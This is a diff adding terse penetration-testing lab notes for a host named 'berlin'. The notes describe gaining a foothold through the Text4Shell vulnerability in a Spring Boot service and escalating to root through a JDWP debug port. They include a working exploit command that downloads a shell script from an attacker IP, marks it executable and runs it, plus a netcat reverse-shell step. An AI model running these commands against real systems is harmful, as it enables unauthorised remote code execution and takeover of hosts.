@@ -121,6 +121,17 @@ SF:background-color:#525D76;border:none;}</style></head><body");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## Foothold
+1. found 8080 port hosting java springboot
+2. text2shell vuln found https://github.com/gustanini/CVE-2022-42889-Text4Shell-POC 
+3. ``` python3 text4shell.py -u 'http://berlin:8080/search?query=' -c 'wget 192.168.45.176/bash.sh -O /tmp/bash.sh && chmod +x /tmp/bash.sh && /tmp/bash.sh ' -m 'rce' ```
+4. ```  python3 text4shell.py -u 'http://berlin:8080/search?query=' -c '/tmp/bash.sh ' -m 'rce'  ```
+
+## Root
+1. Found jdwp exploit
+2. running python3 https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol on victim
+3. trigger event by running nc 5000 and get the shell
+
 # .151 Gust
 ```
 PORT     STATE SERVICE          VERSION
